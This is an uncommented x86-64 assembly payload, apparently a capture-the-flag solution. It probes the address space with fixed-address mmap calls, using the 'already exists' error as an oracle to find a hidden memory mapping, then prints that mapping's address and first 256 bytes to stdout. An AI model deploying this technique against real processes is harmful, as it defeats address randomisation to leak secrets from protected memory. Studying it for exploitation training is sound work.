.intel_syntax noprefix
.global _start
.section .text
_start:
    mov r12, 0x100000000000
    mov r13, 0x400000000

search:
    shr r13, 1

    mov eax, 9
    mov rdi, r12
    mov rsi, r13
    xor edx, edx
    mov r10d, 0x100022
    push -1
    pop r8
    xor r9d, r9d
    syscall

    cmp rax, -17
    je occupied

    mov eax, 11
    mov rdi, r12
    mov rsi, r13
    syscall
    add r12, r13

occupied:
    cmp r13, 0x1000
    jne search

    mov r14, 0x31339000
    xor r15d, r15d

    mov qword ptr [r14], r12
    mov eax, 1
    mov edi, 1
    mov rsi, r14
    mov edx, 8
    syscall

leak:
    mov rax, qword ptr [r12+r15]
    mov qword ptr [r14], rax

    mov eax, 1
    mov edi, 1
    mov rsi, r14
    mov edx, 8
    syscall

    add r15, 8
    cmp r15, 0x100
    jne leak

    mov eax, 231
    xor edi, edi
    syscall
